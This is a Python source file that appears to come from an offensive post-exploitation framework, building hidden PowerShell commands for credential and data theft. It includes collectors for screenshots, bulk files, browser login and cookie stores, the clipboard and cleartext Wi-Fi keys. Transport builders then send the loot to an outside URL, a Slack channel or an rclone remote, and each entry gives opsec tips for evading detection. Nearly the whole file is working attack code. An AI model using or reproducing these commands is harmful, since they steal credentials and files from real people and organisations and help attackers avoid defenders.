# language: Python 3.11+, file: cf/collect.py
# *collection & exfil — staged powershell snippets + transport builders*
from __future__ import annotations

from typing import Any

from .util import json_dumps

COLLECTORS: dict[str, dict[str, str]] = {
    "screen": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
            "$b=[Windows.Forms.Screen]::PrimaryScreen.Bounds;"
            "$bmp=New-Object Drawing.Bitmap $b.Width,$b.Height;"
            "$g=[Drawing.Graphics]::FromImage($bmp);"
            "$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);"
            "$ms=New-Object IO.MemoryStream;"
            "$bmp.Save($ms,[Drawing.Imaging.ImageFormat]::Jpeg);$ms.ToArray()\""
        ),
        "mitre": "T1113",
        "telemetry": "sysmon:1, 4688",
        "opsec": "rundll32/printscreen is the classic detection; keep it one-shot",
    },
    "files": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "$staging=Join-Path $env:TEMP (New-Guid).ToString();"
            "New-Item -ItemType Directory $staging | Out-Null;"
            "Get-ChildItem {path} -Recurse -File -ErrorAction SilentlyContinue | "
            "Sort-Object Length -Desc | Select-Object -First {limit} | "
            "Copy-Item -Dest $staging;"
            "Compress-Archive -Path $staging\\* -DestinationPath $staging.zip -Force;"
            "Get-Content $staging.zip -Encoding Byte -ReadCount 0 | "
            "ForEach-Object {{ [Convert]::ToBase64String($_) }}\""
        ),
        "mitre": "T1005",
        "telemetry": "11, 3, 4688",
        "opsec": "staging + zip in TEMP is the pivot point — delete after exfil",
    },
    "browser": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "$dst=Join-Path $env:TEMP 'browsers';"
            "New-Item -ItemType Directory -Force $dst | Out-Null;"
            "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" $dst -EA SilentlyContinue;"
            "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json\" $dst -EA SilentlyContinue;"
            "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cookies\" $dst -EA SilentlyContinue;"
            "Compress-Archive -Path $dst -DestinationPath $dst.zip -Force\""
        ),
        "mitre": "T1555.003",
        "telemetry": "sysmon:1, 11",
        "opsec": "steals encrypted blobs only — decryption needs the master key from lsass",
    },
    "clipboard": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Add-Type -AssemblyName System.Windows.Forms;"
            "[Windows.Forms.Clipboard]::GetText()\""
        ),
        "mitre": "T1115",
        "telemetry": "sysmon:1",
        "opsec": "clipboard is short-lived; poll once per beacon instead of a loop",
    },
    "wifi": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "$dst=Join-Path $env:TEMP 'wifi';"
            "New-Item -ItemType Directory -Force $dst | Out-Null;"
            "netsh wlan export profile key=clear folder=$dst;"
            "Get-ChildItem $dst -Filter *.xml | ForEach-Object {{ Get-Content $_ -Raw }}\""
        ),
        "mitre": "T1555.004",
        "telemetry": "4104, 4688",
        "opsec": "xml profiles contain cleartext keys — exfil immediately",
    },
}


def collector(kind: str, **values: str) -> dict[str, str]:
    spec = COLLECTORS.get(kind)
    if spec is None:
        raise KeyError(f"unknown collector: {kind}")
    out = spec["command"].format(**values)
    return {
        "kind": kind,
        "command": out,
        "mitre": spec["mitre"],
        "telemetry": spec["telemetry"],
        "opsec": spec["opsec"],
        "json": json_dumps({"kind": kind, "command": out}),
    }


EXFIL: dict[str, dict[str, str]] = {
    "http": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Invoke-RestMethod -Uri '{url}' -Method Post -Body "
            "(Get-Content {path} -Encoding Byte -ReadCount 0) -ContentType application/octet-stream\""
        ),
        "mitre": "T1041",
        "telemetry": "3, 4688, netmon",
        "opsec": "single POST per file — no keepalive, rotate the host",
    },
    "slack": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Invoke-RestMethod -Uri '{url}' -Method Post -Headers "
            "@{{'Authorization'='Bearer {key}'}} -Body (ConvertTo-Json @{{text=(Get-Content {path} -Encoding Byte -ReadCount 0 | ConvertTo-Json)}})\""
        ),
        "mitre": "T1567.004",
        "telemetry": "proxy logs, 3",
        "opsec": "channel membership is the giveaway — burn the workspace after one burst",
    },
    "rclone": {
        "command": "rclone.exe copy {path} remote:exfil --config rclone.conf --transfers 4 --bwlimit 1M",
        "mitre": "T1567",
        "telemetry": "sysmon:1, dns, proxy",
        "opsec": "rename the binary and pin --bwlimit — bursts trigger DLP",
    },
}


def exfil(kind: str, **values: str) -> dict[str, str]:
    spec = EXFIL.get(kind)
    if spec is None:
        raise KeyError(f"unknown exfil: {kind}")
    out = spec["command"].format(**values)
    return {
        "kind": kind,
        "command": out,
        "mitre": spec["mitre"],
        "telemetry": spec["telemetry"],
        "opsec": spec.get("opsec", "single burst is safer than a long stream"),
        "json": json_dumps({"kind": kind, "command": out}),
    }


def list_kinds() -> list[dict[str, Any]]:
    return [
        {"kind": k, "mitre": v["mitre"], "telemetry": v["telemetry"]}
        for k, v in COLLECTORS.items()
    ]
